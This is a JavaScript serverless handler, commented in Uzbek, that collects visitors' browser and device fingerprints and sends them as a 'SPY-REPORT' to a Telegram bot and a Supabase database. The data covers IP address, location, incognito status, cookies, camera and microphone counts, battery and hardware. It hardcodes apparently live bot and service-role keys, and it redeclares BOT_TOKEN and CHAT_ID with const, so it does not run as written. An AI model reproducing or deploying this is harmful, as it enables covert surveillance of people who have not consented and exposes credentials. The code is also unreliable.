export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const BOT_TOKEN = '8719431824:AAGiJ9wTJ5XAn3xv0mr1weYhgOyAq-KFblA';
    const CHAT_ID = '5572037414';
    
    const data = req.body;
    
    // O'zbekiston vaqtini hisoblaymiz (UTC + 5)
    const now = new Date();
    const uzTime = new Date(now.getTime() + (5 * 60 * 60 * 1000)).toLocaleString('uz-UZ', { timeZone: 'UTC' });

    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    const ua = data.userAgent || '';
    
    // Brauzer yoki Ilovani aniqlash
    let browserName = "Noma'lum brauzer";
    if (ua.includes('Instagram')) browserName = "📸 Instagram App";
    else if (ua.includes('Telegram')) browserName = "✈️ Telegram App";
    else if (ua.includes('SamsungBrowser')) browserName = "📱 Samsung Browser";
    else if (ua.includes('Chrome')) browserName = "🌐 Google Chrome";
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browserName = "🧭 Safari";
    else if (ua.includes('Firefox')) browserName = "🦊 Firefox";
    else browserName = "Brauzer: " + (ua.split(' ')[0] || "Noma'lum");

    // Telefon modelini taxminiy aniqlash (Android uchun)
    let deviceModel = data.platform || "Noma'lum qurilma";
    if (ua.includes('Android')) {
        const match = ua.match(/\(([^;]+);[^;]+; ([^;)]+)\)/);
        if (match && match[2]) {
            deviceModel = "🤖 " + match[2].trim();
        } else {
            const androidMatch = ua.match(/Android [^;]+; ([^;)]+)/);
            if (androidMatch) deviceModel = "🤖 " + androidMatch[1].trim();
        }
    } else if (ua.includes('iPhone')) {
        deviceModel = "🍎 iPhone";
    }

    const message = `
🕵️‍♂️ *SPY-REPORT: ${data.fingerprint || 'Noma\'lum'}*
----------------------------
🕒 *Vaqt:* ${uzTime}
📱 *Qurilma:* ${data.exactModel || deviceModel}
🌐 *Ilova:* ${browserName}

🆔 *Fingerprint:* \`${data.fingerprint}\`
🕵️ *Incognito:* ${data.incognito}
🍪 *Cookies:* ${data.cookies}
📷 *Media:* Video(${data.media?.videoinput || 0}), Audio(${data.media?.audioinput || 0})

🔋 *Batareya:* ${data.battery?.level || 'Noma\'lum'} (${data.battery?.charging || ''})
🧠 *RAM:* ${data.ram} GB | *CPU:* ${data.cores}
🎮 *GPU:* \`${data.gpu}\`

📡 *Internet:* ${data.connection?.type || 'Noma\'lum'}
🌍 *Region:* ${data.timezone} | 🇺🇿 *Til:* ${data.language}
👆 *Touch:* ${data.touchPoints} | 📐 *Holat:* ${data.orientation}

🌍 *IP:* ${ip}
📍 *Joylashuv:* ${data.city || ''}, ${data.country || ''}
----------------------------
`;

    // O'zgaruvchilarni olish (Vercel-dan yoki hardcoded)
    const BOT_TOKEN = process.env.BOT_TOKEN || '8719431824:AAGiJ9wTJ5XAn3xv0mr1weYhgOyAq-KFblA';
    const CHAT_ID = process.env.CHAT_ID || '5572037414';
    const SUPABASE_URL = process.env.SUPABASE_URL || 'https://hhsasepeklroqbvnaewg.supabase.co';
    const SUPABASE_KEY = process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imhoc2FzZXBla2xyb3Fidm5hZXdnIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3NzY2NzM5MiwiZXhwIjoyMDkzMjQzMzkyfQ.U4wV6U3dCbl29f8X3Jng6EMfoPoPpxYLkJhF1xvPhys';

    // 1. Supabase-ga saqlash (Alohida blokda, xatolik Telegramni to'xtatmasligi uchun)
    try {
        await fetch(`${SUPABASE_URL}/rest/v1/visitors`, {
            method: 'POST',
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=minimal'
            },
            body: JSON.stringify({
                fingerprint: data.fingerprint,
                device_model: data.exactModel || deviceModel,
                browser_app: browserName,
                ip_address: ip,
                location: `${data.city || ''}, ${data.country || ''}`,
                battery: `${data.battery?.level || ''} (${data.battery?.charging || ''})`,
                ram: data.ram?.toString(),
                cpu_cores: data.cores?.toString(),
                gpu: data.gpu,
                timezone: data.timezone,
                language: data.language,
                connection: JSON.stringify(data.connection),
                screen_size: data.screenSize,
                referrer: data.referrer,
                user_agent: ua,
                incognito: data.incognito,
                cookies: data.cookies,
                media: JSON.stringify(data.media || {})
            })
        });
    } catch (dbError) {
        console.error('Supabase xatoligi:', dbError);
    }

    // 2. Telegram-ga yuborish
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (tgError) {
        console.error('Telegram xatoligi:', tgError);
    }

    return res.status(200).json({ success: true });
}
